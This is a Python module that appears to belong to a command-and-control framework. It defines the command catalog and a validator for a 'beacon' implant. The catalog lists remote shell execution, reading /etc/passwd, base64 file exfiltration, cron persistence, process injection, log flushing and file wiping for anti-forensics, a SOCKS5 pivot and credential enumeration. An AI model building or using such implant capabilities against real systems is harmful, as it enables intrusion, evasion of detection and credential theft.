"""Built-in command catalog shared by server (for validation/help) and beacon.

Each command has a handler implemented in the beacon client. The server needs
the list to present tasking options and help text.
"""
import random


# Commands supported by the Python beacon.
#  name: (description, needs_arg, example)
COMMANDS = {
    "help":       ("List available beacon commands", False, "help"),
    "shell":      ("Run a shell command on target", True, "shell uname -a"),
    "cd":         ("Change working directory", True, "cd /tmp"),
    "pwd":        ("Print working directory", False, "pwd"),
    "ls":         ("List directory", True, "ls /var"),
    "cat":        ("Read file contents", True, "cat /etc/passwd"),
    "download":   ("Read file as base64", True, "download /etc/hostname"),
    "upload":     ("Write base64 data to a file (value=upload <path>;<b64>)", True, "upload /tmp/x;Zm9v"),
    "info":       ("Show beacon metadata/environment", False, "info"),
    "whoami":     ("Show current user", False, "whoami"),
    "sysinfo":    ("OS / arch / kernel details", False, "sysinfo"),
    "sleep":      ("Change beacon callback interval (seconds)", True, "sleep 10"),
    "exit":       ("Tell beacon to terminate/cleanup", False, "exit"),
    "exec":       ("Run a Python expression in beacon", True, "exec 1+1"),

    # --- operational modules ---
    "persist":    ("Install persistence: persist <mechanism> <payload_path> [name]", True,
                   "persist cron /tmp/b.py"),
    "inject":     ("Process injection: inject <tech> <pid> <payload_ref>", True,
                   "inject win-dll 1234 C:\\\\x\\\\m.dll"),
    "wipe":       ("Anti-forensics: wipe a file (Wipe <path> [rounds])", True, "wipe /tmp/beacon.log 2"),
    "flushlogs":  ("Best-effort flush of OS logs", False, "flushlogs"),
    "cleanmru":   ("Remove a path from OS recently-used lists", True, "cleanmru /tmp/x"),
    "selfdestruct": ("Wipe this beacon file + temp copies and exit", True, "selfdestruct /tmp/b.py"),
    "socks":  ("Start SOCKS5 pivot on beacon: socks <port>", True, "socks 1080"),
    "socks-stop":  ("Stop the beacon SOCKS5 pivot", False, "socks-stop"),
    "creds":  ("Enumerate OS-exposed credentials (authorized use only): creds [env|windows|linux|all]", True, "creds all"),
    "disconnect": ("Server-ordered disconnect: beacon stops and socket closes", False, "disconnect"),
}

# On a fresh check-in, if no task queued, beacon may run nothing.
# Server-side commands (operated purely in the console) are not sent to beacons.

ALL_NAMES = list(COMMANDS.keys())


def validate_cmd(cmdline):
    """Validate a task command line; returns (name, args, error)."""
    parts = cmdline.strip().split(maxsplit=1)
    if not parts:
        return None, None, "empty command"
    name = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""
    if name not in COMMANDS:
        return name, args, f"unknown command: {name}. use 'help'"
    needs_arg = COMMANDS[name][1]
    if needs_arg and not args.strip():
        return name, args, f"'{name}' requires an argument. e.g. {COMMANDS[name][2]}"
    return name, args, None


def generate_stager_payload():
    return None
